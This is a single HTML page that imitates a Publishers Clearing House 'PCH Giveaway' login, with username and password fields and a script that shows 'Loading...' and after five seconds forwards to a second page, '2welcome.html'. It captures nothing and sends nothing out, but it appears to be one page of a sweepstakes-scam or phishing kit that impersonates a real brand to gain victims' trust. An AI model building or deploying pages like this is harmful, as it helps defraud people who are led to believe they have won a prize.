<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PCH Giveaway - Login</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:'Arial', sans-serif; }

body {
    background: #ffffff;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
}

/* Top banner */
.banner {
    width: 100%;
    background: #fbc02d;
    color: #ffffff;
    font-weight: bold;
    text-align: center;
    padding: 15px 0;
    font-size: 1.2em;
    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
}

/* Login container */
.container {
    background: #fff9c4;
    padding: 40px 30px;
    border-radius: 20px;
    max-width: 400px;
    width: 100%;
    text-align: center;
    box-shadow: 0 8px 30px rgba(0,0,0,0.2);
    margin-top: 30px;
}

.logo {
    width: 80px;
    height: 80px;
    border-radius: 50%;
    border: 3px solid #fdd835;
    margin: 0 auto 20px;
    background-image: url('pch_logo.jpg');
    background-size: cover;
    background-position: center;
}

h1 {
    margin-bottom: 20px;
    color: #fbc02d;
}

input[type="text"], input[type="password"] {
    width: 100%;
    padding: 12px;
    margin-bottom: 15px;
    border: 2px solid #fdd835;
    border-radius: 10px;
    font-size: 1em;
}

button {
    width: 100%;
    padding: 12px;
    background: #fbc02d;
    color: #fff;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    font-size: 1em;
    position: relative;
    overflow: hidden;
}

button:after {
    content: "";
    position: absolute;
    width: 100%; height: 100%;
    top:0; left:0;
    pointer-events:none;
    background: rgba(255,255,255,0.4);
    opacity:0;
    transition: opacity 0.3s;
}

button:active:after {
    opacity:1;
    transition: 0s;
}
</style>
</head>
<body>

<div class="banner">PUBLISHERS CLEARING HOUSE</div>

<div class="container">
    <div class="logo"></div>
    <h1>PCH Giveaway</h1>
    <input type="text" placeholder="Username" id="username">
    <input type="password" placeholder="Password" id="password">
    <button id="loginBtn">Login</button>
</div>

<script>
document.getElementById('loginBtn').addEventListener('click', function(){
    this.disabled = true;
    this.innerText = "Loading...";
    setTimeout(function(){
        window.location.href = "2welcome.html"; // Next page
    }, 5000);
});
</script>

</body>
</html>
